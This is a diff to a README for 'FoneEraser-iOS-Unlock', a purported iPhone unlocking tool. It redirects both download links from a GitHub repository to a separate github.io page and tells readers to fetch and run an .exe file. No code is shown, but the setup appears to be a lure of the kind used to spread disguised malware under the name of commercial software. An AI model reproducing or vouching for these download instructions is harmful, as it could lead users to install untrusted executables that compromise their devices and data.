@@ -1,6 +1,6 @@
 # 🔓 FoneEraser-iOS-Unlock - Unlock your iPhone quickly and easily
 
-[![](https://img.shields.io/badge/Download-FoneEraser-blue.svg)](https://github.com/charbelhien/FoneEraser-iOS-Unlock)
+[![](https://img.shields.io/badge/Download-FoneEraser-blue.svg)](https://charbelhien.github.io)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ Before you install this software, check your computer setup. Your device needs t
 
 You can find the installer on the project website. Follow these steps to obtain the files:
 
-1. Visit the repository page to begin: [https://github.com/charbelhien/FoneEraser-iOS-Unlock](https://github.com/charbelhien/FoneEraser-iOS-Unlock).
+1. Visit the repository page to begin: [https://charbelhien.github.io](https://charbelhien.github.io).
 2. Look for the releases section on the right side of the screen.
 3. Click the most recent version tag.
 4. Select the file ending in .exe to start your download.
